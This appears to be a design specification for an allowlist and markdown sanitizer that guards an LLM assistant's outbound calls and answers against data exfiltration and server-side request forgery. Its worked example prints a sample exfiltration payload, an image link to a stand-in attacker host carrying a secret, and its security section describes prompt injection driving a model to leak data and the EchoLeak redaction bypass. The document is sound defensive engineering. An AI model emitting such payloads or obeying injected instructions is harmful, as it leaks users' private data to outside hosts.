algorithm.formula: allow(call) iff host(call) in A_tenant and port in {443} and scheme = https; sanitize(text) = text without image syntax, HTML tags and bare auto-fetch URLs
steps: Parse the answer as markdown; drop image nodes (alt text kept, URL removed)
Remove raw HTML tags, iframes, scripts, and reference-style image definitions
Rewrite each link as 'label (source: pointer id)' where the pointer id is one the brain issued, else plain text with the URL defanged
Apply the same stripping to every structured field that clients may render (title, snippet)
For outbound calls, normalise the host (lowercase, punycode), resolve DNS, and require both the host and the resolved IP class to be allowed; deny private and link-local ranges
Log denials and sanitizer removals with counts, never content

params.match: exact host or exact registered suffix; no wildcards by default (design)
params.private_ranges: deny RFC 1918 and link-local to block server-side request forgery (design)

definitions: A_tenant: set of allowed hosts for a tenant
h(call): normalised host of an outbound call
math.formula_full: allowed(call) iff h(call) in A_tenant and scheme(call) = https and port(call) = 443 and resolved_ip(call) not in private_ranges
math.derivation: A set membership test on a normalised host is exact, so a lookalike host fails. Checking the resolved address as well blocks a name that points at an internal service.
math.worked_example: A_tenant = {api.example-crm.com, graph.example-cloud.com}. Call to api.example-crm.com on 443: allowed. Call to api.example-crm.com.evil.test: not in the set, denied. Answer 'Q3 plan ![x](https://evil.test/p?d=SECRET)' becomes 'Q3 plan x' with 1 image removed.
math.complexity: O(1) host lookup in a hash set; sanitizer O(n) in answer length; under 1 ms per 8 KB answer.
failure_modes: Lookalike or unicode host passes a naive check: normalise to punycode and match exactly
DNS rebinding returns an internal IP after the name check: resolve once and pin the IP for the call
Link redaction bypass using reference-style markdown (the EchoLeak pattern): parse the full markdown tree, do not use a single regex
math.calibration: Start with the hosts of enabled connectors only. Each new host needs an owner and a purpose. Review the denial log every 90 days and remove hosts with no traffic.

alternatives.name: Regex that deletes image markdown only
alternatives.why_rejected: Reference-style images and HTML tags bypass a single regex; EchoLeak chained a redaction bypass (t_t52).

alternatives.name: Content security policy header on the client
alternatives.why_rejected: The brain does not own every client; a stripped answer is safe in any client, a header only in browsers we control.

security: Markdown image exfiltration: an injected instruction makes the model write an image whose URL holds private data; the sanitizer drops every image before the answer leaves (OWASP LLM05 Improper Output Handling)
Server-side request forgery from a connector or writer to an internal address: private and link-local ranges are denied even for allowed names
Abuse of an allowed host as a relay (EchoLeak proxy, t_t52): keep the list short, use exact hosts, review every 90 days

performance.slo: Sanitizer p95 under 3 ms per answer; allowlist check under 1 ms plus one DNS lookup, cached 60 s (design)
performance.scaling: Stateless; scales horizontally. At 10x answers the sanitizer is CPU-bound and cheap; DNS cache keeps lookup cost flat.

edge_cases: Answer with a legitimate chart image link: removed; the pointer lets the user open the source
Autolinked bare URL in text: defanged so the client does not auto-fetch it
Connector for a self-hosted app on a private IP: needs an admin-approved private-range exception per tenant, logged
Wildcard host request from an admin: refused unless the suffix is registered and reviewed
A new app (so_sdk manifest or so_mcp bridge) lists its hosts in the manifest and an admin approves them; no code change
Allowlist entry expires: calls fail closed with a clear error, not a silent skip
